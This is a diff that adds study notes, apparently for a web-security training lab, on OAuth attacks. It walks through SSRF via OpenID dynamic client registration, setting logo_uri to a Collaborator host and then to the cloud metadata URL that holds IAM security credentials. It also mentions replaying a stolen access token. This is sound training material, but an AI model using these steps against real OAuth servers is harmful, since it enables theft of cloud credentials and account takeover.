@@ -63,4 +63,20 @@ path=https%3A%2F%2Fexploit-...exploit-server.net%2Fexploit#access_token=ydIftLLy
 - find token in exploit server logs and add it to **GET /me**
 
 #### SSRF via OpenID dynamic client registration
-TODO
+- according to theory - visit **https://oauth-...oauth-server.net/.well-known/openid-configuration**
+- study the config
+```
+https://oauth-...oauth-server.net/jwks --> find jwt keys
+"registration_endpoint": "https://oauth-...oauth-server.net/reg" --> register your web app
+```
+- in HTTP history find request:
+```
+https://oauth-...oauth-server.net/client/client-id/logo
+```
+- register web app with "logo_uri":"http://COLLAB", in response find client_id
+- visit:
+```
+https://oauth-...oauth-server.net/client/COLLAB-client-id/logo
+```
+- find that collaborator received request
+- change logo_uri to http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
